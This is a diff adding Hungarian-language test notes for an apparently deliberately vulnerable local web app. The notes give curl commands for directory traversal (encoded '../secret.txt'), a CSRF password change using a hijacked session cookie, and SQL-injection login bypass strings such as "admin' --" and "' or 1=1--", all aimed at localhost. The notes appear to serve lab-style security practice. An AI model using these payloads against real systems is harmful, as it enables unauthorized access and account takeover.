@@ -1,0 +1,42 @@
+Directory-Traversal tesztelése: 
+    localhost:8000/read-file/ endpointon lehet ügyeskedni. Ehhez nem feltétlen kell curl, 
+    bár a gyors egymásutáni parancsok/scriptek futtatásához előnyösebb.
+    Alapvetően az endpoint a /static_files könyvtárból olvas.
+    Pl.:
+        curl "http://localhost:8000/read-file/?filename=example.txt"
+        output: "Ez csak egy random példa"
+    Különösebb védelem nélkül könnyedén ki lehet olvasni más könyvtárak fájljait is.
+    Pl.:
+        curl "http://localhost:8000/read-file/?filename=../secret.txt"
+        vagy "...filename=%2e%2e/secret.txt"
+        vagy éppen "...filename=%252E%252E%252Fsecret.txt" (bár ez inkább csak Microsoft ISS szerverre jellemző - ez nem is fontos igazából)
+        output: "Szupertitkos szöveg ^o.o^"
+
+CSRF szimulálása:
+1. Bejelentkezés
+    Ez lehet localhost:8000/docs oldalon...
+        Ilyenkor a cookie elmentésre kerül a /Storage/Cookies/ helyen session_id néven
+    Vagy terminalból curl segítségével, csak akkor ügyelni kell a cookie kimentésére [-c ~ cookie-jar]
+    curl -X POST "http://localhost:8000/login/" -d "username=admin' --&password=vmi" -c cookies.txt
+    
+    
+2. Cookie hijacking - szimulálva a csrf_expl.html-lel
+    Hogy sikeresen meg tudja változtatni a felhasználó jelszavát, 
+    a cookie-t ki kell nyerni és el kell küldeni azt a http metódus fejlécében.
+    Ha böngészőben "jelentkezünk be", akkor az alábbi módon lehet működésre bírni:
+        python -m http.server 9000
+    Vagy ha a terminálnál maradunk, akkor az előbb kimentett cookie-t használjuk az alábbi módon:
+        curl -X POST "http://localhost:8000/update-password/" -d "new_password=uj_jelszo" -b cookies.txt
+
+3. Ennyi
+
+SQL-Injection tesztelése
+Sikeres SQL parancsok (Curl tesztelés):
+Minden parancs így kezdődik egyelőre curl -X POST "http://localhost:8000/login/" -d
+[login bypass] - 
+    -  "username=admin' --&password=vmi" 
+    -  "username=admin' /*&password=vmi"
+    -  "username=' or 1=1--&password=vmi"
+    -  "username=' or 1=1 /*&password=vmi"
+
+[táblák lekérdezése UNION segítségével] - (ehhez előbb valami felhasználói felületre lesz szükség)
